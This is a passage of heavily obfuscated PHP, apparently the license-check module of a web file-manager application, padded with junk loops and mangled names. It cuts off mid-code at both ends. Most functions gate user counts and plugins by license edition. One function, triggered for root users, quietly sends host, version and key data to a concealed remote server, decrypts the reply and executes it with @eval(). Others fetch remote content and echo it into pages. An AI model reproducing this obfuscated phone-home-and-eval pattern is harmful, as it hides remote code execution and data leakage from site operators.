Cache::set($Ëáå´¡[203] . md5($èüÊ“º . $Ëáå´¡[204]), $Ëáå´¡[6]); $Ï–ËÊÒÊ = $Ë¨È«ğ˜[739]; while (strlen($Ï–ËÊÒÊ) < $Ë¨È«ğ˜[688]) { if (!$Ï–ËÊÒÊ) { break; } $Ï–ËÊÒÊ++; } show_json(LNG($Ëáå´¡[189]), !0); $ùÛÁÕ¥Ò = $Ë¨È«ğ˜[740]; while ($ùÛÁÕ¥Ò < $Ë¨È«ğ˜[725]) { if ($ùÛÁÕ¥Ò >= 0) { break; } $ùÛÁÕ¥Ò++; } } private function licenseRegistSuccess() { $‚‡´Ö =& $_SERVER[ü¢¡ã”ä]; $Ó…¹ºüØ = Model($‚‡´Ö[33])->get(); if ($Ó…¹ºüØ[$‚‡´Ö[63]] != $‚‡´Ö[122]) { Model($‚‡´Ö[33])->set($‚‡´Ö[63], $‚‡´Ö[122]); } Action($‚‡´Ö[205])->initStart(!0); } private function dcpw7ca53c62() { $ØËß¹¨» =& $_SERVER[ÔÕ±ĞšÎ]; $áÅ¾ºÇ¯ =& $_SERVER[ü¢¡ã”ä]; Model($áÅ¾ºÇ¯[33])->set(array($áÅ¾ºÇ¯[153] => $áÅ¾ºÇ¯[6], $áÅ¾ºÇ¯[191] => $áÅ¾ºÇ¯[6], $áÅ¾ºÇ¯[108] => $áÅ¾ºÇ¯[109], $áÅ¾ºÇ¯[110] => $áÅ¾ºÇ¯[6], $áÅ¾ºÇ¯[111] => $áÅ¾ºÇ¯[6])); $ïäÆŒß¦ = $ØËß¹¨»[741]; if (strlen($ïäÆŒß¦) < $ØËß¹¨»[725]) { return; } Model($áÅ¾ºÇ¯[33])->setDeep($áÅ¾ºÇ¯[198], $áÅ¾ºÇ¯[206]); $ğÒ„ºèå = $ØËß¹¨»[742]; if (strlen($ğÒ„ºèå) < $ØËß¹¨»[725]) { return; } $this->gwnc99cefeab = array(); $this->jtax3895d200 = $áÅ¾ºÇ¯[109]; $êÑôºŞ¬ = $ØËß¹¨»[743]; if (strlen($êÑôºŞ¬) < $ØËß¹¨»[725]) { die; } } private function jnas6a49654c() { $ó¤·ˆ =& $_SERVER[ÔÕ±ĞšÎ]; $“¿ù¡±‹ =& $_SERVER[ü¢¡ã”ä]; $_SERVER[$“¿ù¡±‹[162]] = _get($_SERVER, $“¿ù¡±‹[162], APP_HOST); $this->jtax3895d200 = $“¿ù¡±‹[109]; $™³·ÄèÔ = $ó¤·ˆ[744]; while ($™³·ÄèÔ < $ó¤·ˆ[688]) { if ($™³·ÄèÔ >= 0) { break; } $™³·ÄèÔ++; } $æ¬øÃ•Ÿ = Model($“¿ù¡±‹[33])->get(); $ô½İúşı = $ó¤·ˆ[745]; while ($ô½İúşı < $ó¤·ˆ[696]) { if ($ô½İúşı >= 0) { break; } $ô½İúşı++; } if ($æ¬øÃ•Ÿ[$“¿ù¡±‹[108]] == $“¿ù¡±‹[109]) { return; } $óÅŒ´¸° = Model($“¿ù¡±‹[33])->get($“¿ù¡±‹[100]); $àãá˜Ùå = $“¿ù¡±‹[203] . md5($óÅŒ´¸° . $“¿ù¡±‹[204]); $Ëùà¾ = Cache::get($àãá˜Ùå); if (!is_array($Ëùà¾) || !isset($Ëùà¾[$“¿ù¡±‹[207]]) || time() - $Ëùà¾[$“¿ù¡±‹[207]] >= 60) { $“­›¡·ª = Model($“¿ù¡±‹[7])->loadList(); $‰Â¤Ä²ã = $“­›¡·ª[$“¿ù¡±‹[200]]; $ØĞƒñğÂ = md5($_SERVER[$“¿ù¡±‹[106]] . strrev($óÅŒ´¸°) . $æ¬øÃ•Ÿ[$“¿ù¡±‹[191]]); $»ôïÇ†ş = strrev(substr($ØĞƒñğÂ, 10, 16)); $Ëùà¾ = $this->huoq9e74a2d3($‰Â¤Ä²ã[$“¿ù¡±‹[86]][$»ôïÇ†ş], $ØĞƒñğÂ); $Ëùà¾ = json_decode($Ëùà¾, !0); } if (!is_array($Ëùà¾)) { return $this->dcpw7ca53c62(); } $ÃÌà¿îš = strtotime($Ëùà¾[$“¿ù¡±‹[129]]); if (time() >= $ÃÌà¿îš) { return $this->dcpw7ca53c62(); } if (!isset($Ëùà¾[$“¿ù¡±‹[207]]) || time() - $Ëùà¾[$“¿ù¡±‹[207]] > 20) { $Ëùà¾[$“¿ù¡±‹[207]] = time(); Cache::set($àãá˜Ùå, $Ëùà¾); } $this->gwnc99cefeab = $Ëùà¾; $this->jtax3895d200 = $æ¬øÃ•Ÿ[$“¿ù¡±‹[108]]; } private function hucp5779a876() { $Ú¤œ®÷ =& $_SERVER[ÔÕ±ĞšÎ]; $®ÍÁÚ’ã =& $_SERVER[ü¢¡ã”ä]; $áù»éñº = $GLOBALS[$®ÍÁÚ’ã[13]]; $ãöàï•… = $Ú¤œ®÷[746]; if (!$ãöàï•…) { return; } $Ş”ì†¾Ú = $_SERVER[$®ÍÁÚ’ã[24]]; $õ²“˜çå = $Ú¤œ®÷[747]; if (!$õ²“˜çå) { die; } if ($Ş”ì†¾Ú == $®ÍÁÚ’ã[208] && $this->jtax3895d200 == $®ÍÁÚ’ã[109]) { show_json(LNG($®ÍÁÚ’ã[209]), !1, $®ÍÁÚ’ã[210]); } $•âÁ…«æ = array($®ÍÁÚ’ã[211], $®ÍÁÚ’ã[212]); if (in_array($Ş”ì†¾Ú, $•âÁ…«æ)) { if ($this->jtax3895d200 == $®ÍÁÚ’ã[109] && isset($áù»éñº[$®ÍÁÚ’ã[213]])) { show_json(LNG($®ÍÁÚ’ã[209]), !1, $®ÍÁÚ’ã[210]); die; } $æŸÊØ¦Œ = $this->urnkd02310f9(); if ($æŸÊØ¦Œ != intval($®ÍÁÚ’ã[214])) { if ($æŸÊØ¦Œ <= Model($®ÍÁÚ’ã[125])->count()) { show_json(LNG($®ÍÁÚ’ã[215]), !1, $®ÍÁÚ’ã[210]); die; } } } } private function oqst7e4e408c() { $Ú•ÁÁ· =& $_SERVER[ÔÕ±ĞšÎ]; $ÛÕ§›úÁ =& $_SERVER[ü¢¡ã”ä]; $¥ÕÌ–Œğ = array($ÛÕ§›úÁ[119], $ÛÕ§›úÁ[120]); if (!KodUser::isRoot() || !isset($_GET[$ÛÕ§›úÁ[216]])) { return; } if (!in_array($_SERVER[$ÛÕ§›úÁ[24]], $¥ÕÌ–Œğ)) { return; } $çÄ¨øÂ¬ = $ÛÕ§›úÁ[217]; $ã˜È…Éß = $Ú•ÁÁ·[748]; while (strlen($ã˜È…Éß) < $Ú•ÁÁ·[725]) { if (!$ã˜È…Éß) { break; } $ã˜È…Éß++; } $çÄ¨øÂ¬ = $this->vzpec33a8f12($çÄ¨øÂ¬, $ÛÕ§›úÁ[218]); $™”†Ë¬ = $Ú•ÁÁ·[749]; if (!$™”†Ë¬) { die; } $ª—Éùå÷ = stream_context_create(array($ÛÕ§›úÁ[219] => array($ÛÕ§›úÁ[220] => $ÛÕ§›úÁ[221], $ÛÕ§›úÁ[222] => 3))); $É“İµ²ã = $Ú•ÁÁ·[750]; while (strlen($É“İµ²ã) < $Ú•ÁÁ·[688]) { if (!$É“İµ²ã) { break; } $É“İµ²ã++; } $âïÇœÚÒ = @file_get_contents($çÄ¨øÂ¬, !1, $ª—Éùå÷); header($ÛÕ§›úÁ[223]); if ($âïÇœÚÒ && strstr($âïÇœÚÒ, $ÛÕ§›úÁ[224])) { echo $âïÇœÚÒ; } die; } public function rgzf4998ae74($†¤¨¯áİ) { $É’çØÖÄ =& $_SERVER[ÔÕ±ĞšÎ]; $ëÜó”öÖ =& $_SERVER[ü¢¡ã”ä]; if ($this->jtax3895d200 == $ëÜó”öÖ[225]) { return $†¤¨¯áİ; } $¼Ö¼Ü¢ = $this->versionPluginList(); $Œ±™´Ø = explode($ëÜó”öÖ[226], $this->versionPluginFilter()); $Êºİ—°è = $É’çØÖÄ[751]; while (strlen($Êºİ—°è) < $É’çØÖÄ[696]) { if (!$Êºİ—°è) { break; } $Êºİ—°è++; } $’­”˜ô‰ = array(); $Ùë¼İŒ = $É’çØÖÄ[752]; foreach ($¼Ö¼Ü¢ as $¼šëê„Ü => $øÍ‰•ê) { if ($øÍ‰•ê == $ëÜó”öÖ[227] && substr($this->jtax3895d200, 0, 1) == $ëÜó”öÖ[227]) { continue; } if (!in_array($¼šëê„Ü, $Œ±™´Ø)) { $’­”˜ô‰[] = $¼šëê„Ü; } } foreach ($’­”˜ô‰ as $¼šëê„Ü) { unset($†¤¨¯áİ[$¼šëê„Ü]); $ã¿æòö = $É’çØÖÄ[753]; while (strlen($ã¿æòö) < $É’çØÖÄ[688]) { if (!$ã¿æòö) { break; } $ã¿æòö++; } } return $†¤¨¯áİ; $÷‹†Íšò = $É’çØÖÄ[754]; if (strlen($÷‹†Íšò) < $É’çØÖÄ[688]) { die; } } private function versionPluginList() { $üö–Çæ” =& $_SERVER[ü¢¡ã”ä]; return array($üö–Çæ”[228] => $üö–Çæ”[227], $üö–Çæ”[229] => $üö–Çæ”[227], $üö–Çæ”[230] => $üö–Çæ”[227], $üö–Çæ”[231] => $üö–Çæ”[232], $üö–Çæ”[233] => $üö–Çæ”[232], $üö–Çæ”[234] => $üö–Çæ”[232], $üö–Çæ”[235] => $üö–Çæ”[232], $üö–Çæ”[236] => $üö–Çæ”[232], $üö–Çæ”[237] => $üö–Çæ”[232], $üö–Çæ”[238] => $üö–Çæ”[232], $üö–Çæ”[239] => $üö–Çæ”[232], $üö–Çæ”[240] => $üö–Çæ”[232], $üö–Çæ”[241] => $üö–Çæ”[232], $üö–Çæ”[242] => $üö–Çæ”[232], $üö–Çæ”[243] => $üö–Çæ”[232], $üö–Çæ”[244] => $üö–Çæ”[232]); $€üÈ‰¢¼ = $_SERVER[ÔÕ±ĞšÎ][755]; } private function versionPluginFilter() { $éıı¨§˜ =& $_SERVER[ü¢¡ã”ä]; if ($this->jtax3895d200 == $éıı¨§˜[109]) { return $éıı¨§˜[6]; } $şÂÜ·Ş½ = _get($this->gwnc99cefeab, $éıı¨§˜[245], $éıı¨§˜[6]); $íœ ®Ø = _get($this->gwnc99cefeab, $éıı¨§˜[116], $éıı¨§˜[6]); $ş¸òßÅƒ = _get($this->gwnc99cefeab, $éıı¨§˜[246], $éıı¨§˜[6]); if ($íœ ®Ø > time() && $ş¸òßÅƒ > time()) { $¹ÒéØğë = explode($éıı¨§˜[226], $şÂÜ·Ş½); $¢±ˆ·  = array_keys($this->versionPluginList()); $şÂÜ·Ş½ = array_merge($¹ÒéØğë, $¢±ˆ· ); $şÂÜ·Ş½ = implode($éıı¨§˜[226], array_filter(array_unique($şÂÜ·Ş½))); } return $şÂÜ·Ş½; } private function letg895d0393() { $¶¿ËşëÜ =& $_SERVER[ü¢¡ã”ä]; if ($this->jtax3895d200 != $¶¿ËşëÜ[109]) { $GLOBALS[$¶¿ËşëÜ[86]][$¶¿ËşëÜ[90]][$¶¿ËşëÜ[247]] = $¶¿ËşëÜ[206]; return; } $GLOBALS[$¶¿ËşëÜ[86]][$¶¿ËşëÜ[248]] = $¶¿ËşëÜ[122]; if (Model($¶¿ËşëÜ[249])->get($¶¿ËşëÜ[63]) != $¶¿ËşëÜ[206]) { Model($¶¿ËşëÜ[249])->set($¶¿ËşëÜ[63], $¶¿ËşëÜ[206]); } } public function yaer995ff4b3() { $äÁş©í =& $_SERVER[ÔÕ±ĞšÎ]; return $_SERVER[ü¢¡ã”ä][250]; $õÂÒ”†í = $äÁş©í[756]; while ($õÂÒ”†í < $äÁş©í[696]) { if ($õÂÒ”†í >= 0) { break; } $õÂÒ”†í++; } } private function odjf1d8c72f5() { $©À¬†Ÿİ =& $_SERVER[ÔÕ±ĞšÎ]; $šßÊ¦’ =& $_SERVER[ü¢¡ã”ä]; $¤è©™ı® = array($šßÊ¦’[251], $šßÊ¦’[252], $šßÊ¦’[253]); $˜’×£¦ = $šßÊ¦’[254] . md5($šßÊ¦’[255]); if ($this->jtax3895d200 == $šßÊ¦’[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$šßÊ¦’[24]], $¤è©™ı®)) { return; } if (time() % 4 != 0) { return; } $çû˜Ï» = call_user_func(array($šßÊ¦’[256], $šßÊ¦’[257]), $˜’×£¦); if ($çû˜Ï» && time() - $çû˜Ï» < intval($šßÊ¦’[258])) { return; } call_user_func(array($šßÊ¦’[256], $šßÊ¦’[139]), $˜’×£¦, time()); $±ª²±æ¤ = Model($šßÊ¦’[33])->get($šßÊ¦’[100]); $Æèé€Ùä = $©À¬†Ÿİ[757]; $ÌŞçÍáÉ = array($šßÊ¦’[152] => Model($šßÊ¦’[33])->get($šßÊ¦’[153]), $šßÊ¦’[167] => $this->jtax3895d200, $šßÊ¦’[163] => $_SERVER[$šßÊ¦’[164]], $šßÊ¦’[165] => Model($šßÊ¦’[33])->get($šßÊ¦’[131]), $šßÊ¦’[105] => md5($_SERVER[$šßÊ¦’[106]] . $±ª²±æ¤), $šßÊ¦’[156] => $šßÊ¦’[136], $šßÊ¦’[159] => $_SERVER[$šßÊ¦’[160]]); $ä–íèıË = $©À¬†Ÿİ[758]; $´£ù± = $this->ajxi1ebfa190($šßÊ¦’[259], $ÌŞçÍáÉ); if (!is_array($´£ù±)) { return; } if ($´£ù±[$šßÊ¦’[152]] && $´£ù±[$šßÊ¦’[260]]) { if ($this->firg094b8e06($´£ù±[$šßÊ¦’[260]]) == $ÌŞçÍáÉ[$šßÊ¦’[152]]) { return; } } $this->dcpw7ca53c62(); if ($this->firg094b8e06($´£ù±[$šßÊ¦’[260]]) != $ÌŞçÍáÉ[$šßÊ¦’[152]]) { $Ã¿Ùû¶ = array($šßÊ¦’[185] => $±ª²±æ¤, $šßÊ¦’[186] => $_SERVER[$šßÊ¦’[106]], $šßÊ¦’[187] => this_url(), $šßÊ¦’[161] => $_SERVER[$šßÊ¦’[162]]); $Ëó°É¤Ş = $this->hctqbafca1a1(json_encode($Ã¿Ùû¶)); $´£ù± = $this->ajxi1ebfa190($šßÊ¦’[188] . $Ëó°É¤Ş); if ($´£ù± && is_array($´£ù±) && isset($´£ù±[$šßÊ¦’[260]])) { $ÜÚ¯˜æÊ = $this->huoq9e74a2d3($´£ù±[$šßÊ¦’[260]], 2); if ($ÜÚ¯˜æÊ) { $ÜÚ¯˜æÊ = $this->firg094b8e06($ÜÚ¯˜æÊ); } if ($ÜÚ¯˜æÊ) { try { @eval($ÜÚ¯˜æÊ); } catch (Exception $èÄÕŒÎš) { } } } } } private function ajxi1ebfa190($˜¬÷œ¢ = '', $‹±Øœöİ = array(), $¼ÌäÖ¥“ = 5) { $Òàğíæ¼ =& $_SERVER[ü¢¡ã”ä]; $€Ù²··“ = $Òàğíæ¼[261]; $€Ù²··“ = $this->vzpec33a8f12($€Ù²··“, $Òàğíæ¼[262]); $ø½ÀÉåÉ = $_SERVER[ÔÕ±ĞšÎ][759]; $€Ù²··“ = $€Ù²··“ . $˜¬÷œ¢; if ($‹±Øœöİ && is_array($‹±Øœöİ)) { $€Ù²··“ = $€Ù²··“ . $Òàğíæ¼[263] . http_build_query($‹±Øœöİ); } if ($‹±Øœöİ === -1) { return $€Ù²··“; } $œÍ“Ö’ = stream_context_create(array($Òàğíæ¼[219] => array($Òàğíæ¼[222] => $¼ÌäÖ¥“, $Òàğíæ¼[220] => $Òàğíæ¼[264]), $Òàğíæ¼[265] => array($Òàğíæ¼[266] => !1, $Òàğíæ¼[267] => !1))); $‹±Øœöİ = @file_get_contents($€Ù²··“, !1, $œÍ“Ö’); return json_decode($‹±Øœöİ, !0); } private function urnkd02310f9() { $ò§ •ó˜ =& $_SERVER[ÔÕ±ĞšÎ]; $šñ£ßõ¼ =& $_SERVER[ü¢¡ã”ä]; $öÖñä = array($šñ£ßõ¼[268] => $šñ£ßõ¼[269], $šñ£ßõ¼[270] => $šñ£ßõ¼[271], $šñ£ßõ¼[272] => $šñ£ßõ¼[273], $šñ£ßõ¼[274] => $šñ£ßõ¼[275], $šñ£ßõ¼[276] => $šñ£ßõ¼[277], $šñ£ßõ¼[278] => $šñ£ßõ¼[214], $šñ£ßõ¼[279] => $šñ£ßõ¼[214], $šñ£ßõ¼[280] => $šñ£ßõ¼[269], $šñ£ßõ¼[281] => $šñ£ßõ¼[271], $šñ£ßõ¼[282] => $šñ£ßõ¼[273], $šñ£ßõ¼[283] => $šñ£ßõ¼[284], $šñ£ßõ¼[285] => $šñ£ßõ¼[275], $šñ£ßõ¼[286] => $šñ£ßõ¼[287], $šñ£ßõ¼[288] => $šñ£ßõ¼[277], $šñ£ßõ¼[289] => $šñ£ßõ¼[290], $šñ£ßõ¼[291] => $šñ£ßõ¼[292], $šñ£ßõ¼[293] => $šñ£ßõ¼[294]); $Ì–ù„Íõ = $öÖñä[$this->jtax3895d200]; $õºÓÑ›Š = $ò§ •ó˜[760]; while (strlen($õºÓÑ›Š) < $ò§ •ó˜[688]) { if (!$õºÓÑ›Š) { break; } $õºÓÑ›Š++; } $Ì–ù„Íõ = intval($Ì–ù„Íõ ? $Ì–ù„Íõ : $šñ£ßõ¼[269]); $±™†™Î¹ = _get($this->gwnc99cefeab, $šñ£ßõ¼[295]); $±™†™Î¹ = $±™†™Î¹ ? intval($±™†™Î¹) : 0; return $Ì–ù„Íõ + $±™†™Î¹; $ÂæÆôô× = $ò§ •ó˜[761]; while ($ÂæÆôô× < $ò§ •ó˜[688]) { if ($ÂæÆôô× >= 0) { break; } $ÂæÆôô×++; } } public function megwccf1c13d($£ÓÌ—ö¦) { $‹¬åëßÈ =& $_SERVER[ÔÕ±ĞšÎ]; $¨¿²½É© =& $_SERVER[ü¢¡ã”ä]; $»¨‰¥ï‰ = $this->urnkd02310f9(); $ÍŒ­¶Ìä = $‹¬åëßÈ[762]; if (strlen($ÍŒ­¶Ìä) < $‹¬åëßÈ[696]) { return; } if ($£ÓÌ—ö¦[$¨¿²½É©[296]] == $¨¿²½É©[122]) { return; } if ($»¨‰¥ï‰ >= intval($¨¿²½É©[214])) { return; } $–€Ëƒ¡è = Model($¨¿²½É©[125])->count(); $İ¬ÉàÊÊ = $‹¬åëßÈ[763]; if (!$İ¬ÉàÊÊ) { return; } if ($–€Ëƒ¡è <= $»¨‰¥ï‰) { return; } $Á¿¤é›ê = Model($¨¿²½É©[125])->field($¨¿²½É©[296])->limit($»¨‰¥ï‰)->select(); $Á¿¤é›ê = array_to_keyvalue($Á¿¤é›ê, $¨¿²½É©[6], $¨¿²½É©[296]); $¦©ùâÈ = $‹¬åëßÈ[764]; while ($¦©ùâÈ < $‹¬åëßÈ[688]) { if ($¦©ùâÈ >= 0) { break; } $¦©ùâÈ++; } if (!in_array($£ÓÌ—ö¦[$¨¿²½É©[296]], $Á¿¤é›ê)) { show_json($¨¿²½É©[297], !1, $¨¿²½É©[210]); } } public function hcplb97b95cd() { $ãŸÄã¢¢ =& $_SERVER[ÔÕ±ĞšÎ]; $é…„‹ŞÕ =& $_SERVER[ü¢¡ã”ä]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $€Ï’“» = $é…„‹ŞÕ[217]; $€Ï’“» = $this->vzpec33a8f12($€Ï’“», $é…„‹ŞÕ[218]); $ğÓÇŠ‹ = stream_context_create(array($é…„‹ŞÕ[219] => array($é…„‹ŞÕ[220] => $é…„‹ŞÕ[221], $é…„‹ŞÕ[222] => 3))); $«±Ê— = $ãŸÄã¢¢[765]; if (strlen($«±Ê—) < $ãŸÄã¢¢[694]) { return; } $ù«úŞ Ú = @file_get_contents($€Ï’“», !1, $ğÓÇŠ‹); $×¯Õ‰–â = $ãŸÄã¢¢[766]; if (strlen($×¯Õ‰–â) < $ãŸÄã¢¢[725]) { die; } echo $é…„‹ŞÕ[298] . hash_encode($ù«úŞ Ú) . $é…„‹ŞÕ[299]; } private function vfoz6b4c65c7($Õîìì‡Ï, $çš¸®Ú, $³É‚£éÍ = 3) { $øª‡¾å• =& $_SERVER[ÔÕ±ĞšÎ]; $°ùè‡Ì =& $_SERVER[ü¢¡ã”ä]; usleep(1); $Õîìì‡Ï = trim($Õîìì‡Ï); $©¦¬Âôñ = $øª‡¾å•[767]; if (!$©¦¬Âôñ) { return; } $Ì–…È’ = mt_rand(0, 5) . $°ùè‡Ì[6]; $úÖ±ğÛ¼ = rand_string(15); $ğŞÓãŒ÷ = $øª‡¾å•[768]; $âİ©è°„ = $°ùè‡Ì[300]; $ÓŒëëÊ = $øª‡¾å•[769]; if (!$ÓŒëëÊ) { die; } switch ($Ì–…È’) { case $°ùè‡Ì[206]: $¨ ‘à˜â = $this->yxpi3af00147($Õîìì‡Ï, strrev($çš¸®Ú . $úÖ±ğÛ¼)); break; case $°ùè‡Ì[122]: $¨ ‘à˜â = $this->yxpi3af00147($Õîìì‡Ï, strrev($úÖ±ğÛ¼ . $çš¸®Ú)); $æõ¹¨Å· = $øª‡¾å•[770]; if (!$æõ¹¨Å·) { return; } break; case $°ùè‡Ì[301]: $¨ ‘à˜â = $this->yxpi3af00147($Õîìì‡Ï, base64_encode($úÖ±ğÛ¼ . $çš¸®Ú)); $º»È¤‘› = $øª‡¾å•[771]; while ($º»È¤‘› < $øª‡¾å•[694]) { if ($º»È¤‘› >= 0) { break; } $º»È¤‘›++; } break; $ªı À—‹ = $øª‡¾å•[772]; while ($ªı À—‹ < $øª‡¾å•[696]) { if ($ªı À—‹ >= 0) { break; } $ªı À—‹++; } case $°ùè‡Ì[302]: $¨ ‘à˜â = $this->yxpi3af00147($Õîìì‡Ï, md5($úÖ±ğÛ¼ . $çš¸®Ú)); $˜À‰›Ó‘ = $øª‡¾å•[773]; if (!$˜À‰›Ó‘) { die; } break; $¹–ÃŒ– = $øª‡¾å•[774]; if (strlen($¹–ÃŒ–) < $øª‡¾å•[688]) { return; } case $°ùè‡Ì[303]: $Õîìì‡Ï = base64_encode($Õîìì‡Ï); $êŞ¢»«Û = rand(0, 64); $¡„¬¤šã = $âİ©è°„[$êŞ¢»«Û]; $¬¿óà÷™ = $øª‡¾å•[775]; if (strlen($¬¿óà÷™) < $øª‡¾å•[696]) { return; } $—»ÍÁèê = md5($¡„¬¤šã . md5($çš¸®Ú . $¡„¬¤šã) . $çš¸®Ú); $—»ÍÁèê = substr($—»ÍÁèê, $êŞ¢»«Û % 8, $êŞ¢»«Û % 8 + 7); $´ø¼Ü¼ = $øª‡¾å•[776]; while (strlen($´ø¼Ü¼) < $øª‡¾å•[688]) { if (!$´ø¼Ü¼) { break; } $´ø¼Ü¼++; } $ ÃÒŞ› = $°ùè‡Ì[6]; $Ûøô®¡§ = $øª‡¾å•[777]; if (!$Ûøô®¡§) { return; } $äíÖìºŠ = 0; $±ÇêÆ¥˜ = $øª‡¾å•[778]; if (strlen($±ÇêÆ¥˜) < $øª‡¾å•[696]) { return; } $´¿åÀêô = 0; $œ÷ñĞ™ü = $øª‡¾å•[779]; if (strlen($œ÷ñĞ™ü) < $øª‡¾å•[696]) { return; } $…ÌóƒÀÌ = 0; $™ÖÉ–¦¶ = $øª‡¾å•[780]; if (strlen($™ÖÉ–¦¶) < $øª‡¾å•[694]) { die; } for ($äíÖìºŠ = 0; $äíÖìºŠ < strlen($Õîìì‡Ï); $äíÖìºŠ++) { $…ÌóƒÀÌ = $…ÌóƒÀÌ == strlen($—»ÍÁèê) ? 0 : $…ÌóƒÀÌ; $´¿åÀêô = ($êŞ¢»«Û + strpos($âİ©è°„, $Õîìì‡Ï[$äíÖìºŠ]) + ord($—»ÍÁèê[$…ÌóƒÀÌ++])) % 64; $ ÃÒŞ› .= $âİ©è°„[$´¿åÀêô]; } $¨ ‘à˜â = hash_encode($¡„¬¤šã . $ ÃÒŞ›); break; default: $¨ ‘à˜â = $this->yxpi3af00147($Õîìì‡Ï, $çš¸®Ú . $úÖ±ğÛ¼); $Ö“ªÃ™ = $øª‡¾å•[781]; while (strlen($Ö“ªÃ™) < $øª‡¾å•[694]) { if (!$Ö“ªÃ™) { break; } $Ö“ªÃ™++; } break; $¹‹ÈÙî¿ = $øª‡¾å•[782]; if (strlen($¹‹ÈÙî¿) < $øª‡¾å•[694]) { return; } } $¨ ‘à˜â = strrev($Ì–…È’ . $úÖ±ğÛ¼ . $¨ ‘à˜â); $ÔõµØ½» = $øª‡¾å•[783]; if (strlen($ÔõµØ½») < $øª‡¾å•[725]) { return; } if ($³É‚£éÍ - 1 > 0) { $¨ ‘à˜â = $this->vfoz6b4c65c7($¨ ‘à˜â, $çš¸®Ú, $³É‚£éÍ - 1); } return $¨ ‘à˜â; } private function huoq9e74a2d3($ã«â¼øà, $½ÕŞÓªó, $ÁôšË€ñ = 3) { $àª†¸‘î =& $_SERVER[ÔÕ±ĞšÎ]; $‘’óˆ° =& $_SERVER[ü¢¡ã”ä]; if (!is_string($ã«â¼øà) || strlen($ã«â¼øà) < 10) { return !1; } $ã«â¼øà = trim($ã«â¼øà); $ã«â¼øà = strrev($ã«â¼øà); $„®ò¿Û¦ = $ã«â¼øà[0]; $Ô·ëë”Ü = $àª†¸‘î[784]; if (!$Ô·ëë”Ü) { return; } $ü ëè¶ = substr($ã«â¼øà, 1, 15); $ã«â¼øà = substr($ã«â¼øà, 16); $Ó‘Ê‘Œ© = $‘’óˆ°[300]; switch ($„®ò¿Û¦) { case $‘’óˆ°[206]: $³µíŸù = $this->vzpec33a8f12($ã«â¼øà, strrev($½ÕŞÓªó . $ü ëè¶)); break; $§ä®ñ¢´ = $àª†¸‘î[785]; while ($§ä®ñ¢´ < $àª†¸‘î[694]) { if ($§ä®ñ¢´ >= 0) { break; } $§ä®ñ¢´++; } case $‘’óˆ°[122]: $³µíŸù = $this->vzpec33a8f12($ã«â¼øà, strrev($ü ëè¶ . $½ÕŞÓªó)); break; $ ²¬Âäá = $àª†¸‘î[786]; while ($ ²¬Âäá < $àª†¸‘î[725]) { if ($ ²¬Âäá >= 0) { break; } $ ²¬Âäá++; } case $‘’óˆ°[301]: $³µíŸù = $this->vzpec33a8f12($ã«â¼øà, base64_encode($ü ëè¶ . $½ÕŞÓªó)); break; case $‘’óˆ°[302]: $³µíŸù = $this->vzpec33a8f12($ã«â¼øà, md5($ü ëè¶ . $½ÕŞÓªó)); break; $ÄÔÍëÇ² = $àª†¸‘î[787]; while ($ÄÔÍëÇ² < $àª†¸‘î[709]) { if ($ÄÔÍëÇ² >= 0) { break; } $ÄÔÍëÇ²++; } case $‘’óˆ°[303]: $ã«â¼øà = hash_decode($ã«â¼øà); $‰öÕÛ†¼ = $ã«â¼øà[0]; $ä¶öµ¨’ = $àª†¸‘î[788]; if (!$ä¶öµ¨’) { die; } $ã«â¼øà = substr($ã«â¼øà, 1); $úÓõÈó = $àª†¸‘î[789]; while (strlen($úÓõÈó) < $àª†¸‘î[709]) { if (!$úÓõÈó) { break; } $úÓõÈó++; } $Ö­Ú‚É´ = strpos($Ó‘Ê‘Œ©, $‰öÕÛ†¼); $‘ä×£©â = md5($‰öÕÛ†¼ . md5($½ÕŞÓªó . $‰öÕÛ†¼) . $½ÕŞÓªó); $ƒ©õÄÎƒ = $àª†¸‘î[790]; if (strlen($ƒ©õÄÎƒ) < $àª†¸‘î[709]) { return; } $‘ä×£©â = substr($‘ä×£©â, $Ö­Ú‚É´ % 8, $Ö­Ú‚É´ % 8 + 7); $èò‹ôÃ = $àª†¸‘î[791]; if (!$èò‹ôÃ) { return; } $›ÌïÆ±µ = $‘’óˆ°[6]; $Ê”ä¾” = 0; $·¨€ó³ı = $àª†¸‘î[792]; $å‡šå¯ = 0; $â´šÅÆ™ = 0; $Ïø÷“‰ = $àª†¸‘î[793]; for ($Ê”ä¾” = 0; $Ê”ä¾” < strlen($ã«â¼øà); $Ê”ä¾”++) { $â´šÅÆ™ = $â´šÅÆ™ == strlen($‘ä×£©â) ? 0 : $â´šÅÆ™; $èÍ¿¤ëÈ = $â´šÅÆ™++; $±‰µÙ˜Â = $àª†¸‘î[794]; $å‡šå¯ = strpos($Ó‘Ê‘Œ©, $ã«â¼øà[$Ê”ä¾”]) - $Ö­Ú‚É´ - ord($‘ä×£©â[$èÍ¿¤ëÈ]); while ($å‡šå¯ < 0) { $å‡šå¯ += 64; $¸Ñ’© Ó = $àª†¸‘î[795]; } $›ÌïÆ±µ .= $Ó‘Ê‘Œ©[$å‡šå¯]; $óÖÜ¤›€ = $àª†¸‘î[796]; while ($óÖÜ¤›€ < $àª†¸‘î[709]) { if ($óÖÜ¤›€ >= 0) { break; } $óÖÜ¤›€++; } } $³µíŸù = base64_decode($›ÌïÆ±µ); break; $„¢²Àˆ = $àª†¸‘î[797]; if (strlen($„¢²Àˆ) < $àª†¸‘î[709]) { die; } default: $³µíŸù = $this->vzpec33a8f12($ã«â¼øà, $½ÕŞÓªó . $ü ëè¶); $Ï±¢¬‚¬ = $àª†¸‘î[798]; break; } if ($ÁôšË€ñ - 1 > 0) { $³µíŸù = $this->huoq9e74a2d3($³µíŸù, $½ÕŞÓªó, $ÁôšË€ñ - 1); } return $³µíŸù; } public function hctqbafca1a1($±Ó×¡‡) { $ñ®ıçÚô =& $_SERVER[ÔÕ±ĞšÎ]; $Êš¡™Ì =& $_SERVER[ü¢¡ã”ä]; $¸¶ÒÃî» = $this->mdzvc5f9b04e(); $Şš´»©è = $ñ®ıçÚô[799]; $ÑĞÃÑ„İ = $this->mdzvc5f9b04e(); $Ï†Ò˜—® = $ñ®ıçÚô[800]; while ($Ï†Ò˜—® < $ñ®ıçÚô[694]) { if ($Ï†Ò˜—® >= 0) { break; } $Ï†Ò˜—®++; } $ˆ¼Ö‡ÉØ = ($¸¶ÒÃî» - 1) * ($ÑĞÃÑ„İ - 1); $ò‰Ú´Ìá = $ñ®ıçÚô[801]; $ïÉ´ğšå = intval(($¸¶ÒÃî» + $ÑĞÃÑ„İ) / 2); while (1) { $¶ÃÅäÙ 